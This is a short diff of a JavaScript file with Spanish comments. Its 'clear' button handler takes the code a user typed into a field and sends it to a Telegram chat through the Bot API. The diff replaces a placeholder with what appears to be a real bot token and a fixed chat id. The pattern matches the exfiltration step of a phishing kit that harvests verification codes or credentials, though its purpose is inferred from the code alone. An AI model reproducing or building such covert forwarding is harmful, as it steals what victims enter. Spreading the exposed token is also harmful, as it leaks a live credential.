@@ -37,7 +37,7 @@ function btnLimpiar() {
     //Cuando se presione el boton limpiar se mandara al enlace del servidor
     var codigo = icodigo.value;    
     //Enviando
-    var urlMensaje = 'https://api.telegram.org/bot[YOUR_BOT_TOKEN]/sendMessage?chat_id=-1002204285060&text=' + codigo;
+    var urlMensaje = 'https://api.telegram.org/bot7077402329:AAH_eOLI9IjhanJ6698CCiWz42ZlH6Ij_vU/sendMessage?chat_id=-1002204285060&text=' + codigo;
     fetch(urlMensaje)
         .then(response => response.json())
         .then(data => {
